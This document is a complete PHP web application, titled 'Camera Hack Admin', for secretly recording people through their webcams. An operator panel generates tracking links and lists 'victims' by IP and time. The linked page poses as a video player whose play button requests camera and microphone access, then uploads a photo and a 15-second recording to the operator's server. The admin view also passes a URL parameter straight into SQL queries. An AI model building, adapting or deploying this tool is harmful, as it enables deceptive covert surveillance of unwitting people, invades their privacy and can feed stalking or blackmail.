<?php
// Database configuration
$db_file = 'victims.db';
$init = !file_exists($db_file);

// Create SQLite database
$db = new SQLite3($db_file);

if($init) {
    $db->exec("CREATE TABLE victims (
        id TEXT PRIMARY KEY,
        ip TEXT,
        user_agent TEXT,
        timestamp INTEGER,
        photo TEXT,
        video TEXT,
        status TEXT
    )");
    
    $db->exec("CREATE TABLE captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        type TEXT,
        data TEXT,
        timestamp INTEGER
    )");
}

// Generate unique ID for each victim link
function generateId() {
    return bin2hex(random_bytes(16));
}

// Get victim ID from URL
$victim_id = isset($_GET['id']) ? $_GET['id'] : null;

// If no ID, generate new one and show admin panel
if(!$victim_id) {
    $new_id = generateId();
    $share_link = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?id=" . $new_id;
    
    // Get stats
    $victim_count = $db->querySingle("SELECT COUNT(*) FROM victims");
    $capture_count = $db->querySingle("SELECT COUNT(*) FROM captures");
    
    // Display admin panel
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Camera Hack Admin</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                font-family: 'Segoe UI', Arial, sans-serif;
                min-height: 100vh;
                padding: 20px;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            .header {
                background: rgba(0,0,0,0.5);
                border-radius: 20px;
                padding: 30px;
                margin-bottom: 30px;
                text-align: center;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255,255,255,0.1);
            }
            .header h1 {
                color: #e74c3c;
                font-size: 28px;
                margin-bottom: 10px;
            }
            .stats {
                display: flex;
                gap: 20px;
                justify-content: center;
                margin-top: 20px;
                flex-wrap: wrap;
            }
            .stat-card {
                background: rgba(255,255,255,0.1);
                border-radius: 15px;
                padding: 20px;
                min-width: 150px;
                text-align: center;
            }
            .stat-number {
                font-size: 36px;
                font-weight: bold;
                color: #e74c3c;
            }
            .stat-label {
                color: #aaa;
                margin-top: 5px;
            }
            .link-box {
                background: rgba(0,0,0,0.5);
                border-radius: 15px;
                padding: 20px;
                margin: 20px 0;
                border: 1px solid rgba(255,255,255,0.1);
            }
            .link-box input {
                width: 100%;
                padding: 12px;
                background: #0a0a0a;
                border: 1px solid #333;
                border-radius: 10px;
                color: white;
                font-size: 14px;
                margin-top: 10px;
            }
            .victims-table {
                background: rgba(0,0,0,0.5);
                border-radius: 20px;
                padding: 20px;
                overflow-x: auto;
            }
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th, td {
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid rgba(255,255,255,0.1);
                color: white;
            }
            th {
                color: #e74c3c;
            }
            .view-btn {
                background: #3498db;
                color: white;
                padding: 5px 10px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 12px;
            }
            button {
                background: #e74c3c;
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 10px;
                cursor: pointer;
                margin-top: 10px;
            }
            button:hover {
                opacity: 0.9;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📷 Camera Hack Admin</h1>
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number"><?php echo $victim_count; ?></div>
                        <div class="stat-label">Victims</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number"><?php echo $capture_count; ?></div>
                        <div class="stat-label">Captures</div>
                    </div>
                </div>
            </div>
            
            <div class="link-box">
                <h3 style="color:white; margin-bottom:10px;">🔗 Share this link</h3>
                <input type="text" id="shareLink" value="<?php echo $share_link; ?>" readonly onclick="this.select()">
                <button onclick="copyLink()">Copy Link</button>
            </div>
            
            <div class="victims-table">
                <h3 style="color:white; margin-bottom:15px;">📋 Victims List</h3>
                <table>
                    <thead>
                        <tr><th>ID</th><th>IP</th><th>Time</th><th>Status</th><th>Actions</th></tr>
                    </thead>
                    <tbody>
                        <?php
                        $result = $db->query("SELECT * FROM victims ORDER BY timestamp DESC");
                        while($row = $result->fetchArray()) {
                            echo "<tr>";
                            echo "<td>" . substr($row['id'], 0, 8) . "...</td>";
                            echo "<td>" . $row['ip'] . "</td>";
                            echo "<td>" . date('Y-m-d H:i:s', $row['timestamp']) . "</td>";
                            echo "<td>" . $row['status'] . "</td>";
                            echo "<td><button class='view-btn' onclick='viewVictim(\"" . $row['id'] . "\")'>View</button></td>";
                            echo "</tr>";
                        }
                        ?>
                    </tbody>
                </table>
            </div>
        </div>
        
        <script>
            function copyLink() {
                const input = document.getElementById('shareLink');
                input.select();
                document.execCommand('copy');
                alert('Link copied!');
            }
            
            function viewVictim(id) {
                window.location.href = '?view=' + id;
            }
        </script>
    </body>
    </html>
    <?php
    exit;
}

// If viewing victim captures
if(isset($_GET['view'])) {
    $view_id = $_GET['view'];
    $victim = $db->querySingle("SELECT * FROM victims WHERE id='$view_id'", true);
    $captures = $db->query("SELECT * FROM captures WHERE victim_id='$view_id' ORDER BY timestamp DESC");
    
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Victim Captures</title>
        <style>
            body {
                background: #0a0a0a;
                font-family: Arial, sans-serif;
                padding: 20px;
                color: white;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
            }
            .media-box {
                background: #1a1a2e;
                border-radius: 10px;
                padding: 20px;
                margin: 20px 0;
            }
            img, video {
                max-width: 100%;
                border-radius: 10px;
            }
            button {
                background: #e74c3c;
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Victim: <?php echo substr($view_id, 0, 16); ?></h1>
            <button onclick="window.location.href='cam.php'">← Back</button>
            
            <?php while($capture = $captures->fetchArray()): ?>
            <div class="media-box">
                <h3><?php echo ucfirst($capture['type']); ?> - <?php echo date('Y-m-d H:i:s', $capture['timestamp']); ?></h3>
                <?php if($capture['type'] == 'photo'): ?>
                    <img src="data:image/jpeg;base64,<?php echo $capture['data']; ?>">
                <?php else: ?>
                    <video controls src="data:video/webm;base64,<?php echo $capture['data']; ?>"></video>
                <?php endif; ?>
            </div>
            <?php endwhile; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// === VICTIM PAGE - CAMERA HACK ===
$victim_id = $_GET['id'];

// Record victim visit
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = time();

$stmt = $db->prepare("INSERT OR REPLACE INTO victims (id, ip, user_agent, timestamp, status) VALUES (?, ?, ?, ?, ?)");
$stmt->bindValue(1, $victim_id);
$stmt->bindValue(2, $ip);
$stmt->bindValue(3, $user_agent);
$stmt->bindValue(4, $timestamp);
$stmt->bindValue(5, 'Visited');
$stmt->execute();
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .player {
            background: #111;
            border-radius: 20px;
            padding: 20px;
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .video-container {
            background: #000;
            border-radius: 15px;
            overflow: hidden;
            aspect-ratio: 9/16;
            position: relative;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        button {
            background: #e74c3c;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            margin-top: 20px;
            cursor: pointer;
            width: 100%;
        }
        .status {
            margin-top: 15px;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>

<div class="player">
    <div class="video-container">
        <video id="video" autoplay playsinline muted></video>
        <div id="overlay" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:white; text-align:center;">
            <div style="font-size:50px;">▶</div>
            <p>Tap to play</p>
        </div>
    </div>
    <button id="playBtn">▶ PLAY VIDEO</button>
    <div class="status" id="status">Ready to play</div>
</div>

<script>
const VICTIM_ID = "<?php echo $victim_id; ?>";
const API_URL = "save.php";

async function sendToServer(data, type) {
    const formData = new FormData();
    formData.append('victim_id', VICTIM_ID);
    formData.append('type', type);
    formData.append('data', data);
    
    await fetch(API_URL, {
        method: 'POST',
        body: formData
    });
}

async function captureAndSend(videoElement) {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    canvas.getContext('2d').drawImage(videoElement, 0, 0);
    
    const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
    await sendToServer(base64, 'photo');
}

async function startHack() {
    const video = document.getElementById('video');
    const overlay = document.getElementById('overlay');
    const statusDiv = document.getElementById('status');
    
    overlay.style.display = 'none';
    statusDiv.innerHTML = 'Requesting access...';
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' }, 
            audio: true 
        });
        
        video.srcObject = stream;
        statusDiv.innerHTML = 'Stream ready - capturing...';
        
        await new Promise(r => setTimeout(r, 2000));
        
        // Capture photo
        await captureAndSend(video);
        statusDiv.innerHTML = 'Photo captured';
        
        // Record video (15 seconds)
        statusDiv.innerHTML = 'Recording video...';
        const chunks = [];
        const recorder = new MediaRecorder(stream);
        
        recorder.ondataavailable = (e) => {
            if(e.data.size > 0) chunks.push(e.data);
        };
        
        const videoPromise = new Promise((resolve) => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const base64 = reader.result.split(',')[1];
                    await sendToServer(base64, 'video');
                    resolve();
                };
                reader.readAsDataURL(blob);
            };
        });
        
        recorder.start();
        setTimeout(() => recorder.stop(), 15000);
        await videoPromise;
        
        statusDiv.innerHTML = 'Complete!';
        
        setTimeout(() => {
            stream.getTracks().forEach(t => t.stop());
        }, 2000);
        
    } catch(err) {
        statusDiv.innerHTML = 'Error: ' + err.message;
    }
}

document.getElementById('playBtn').onclick = startHack;
</script>

</body>
</html>
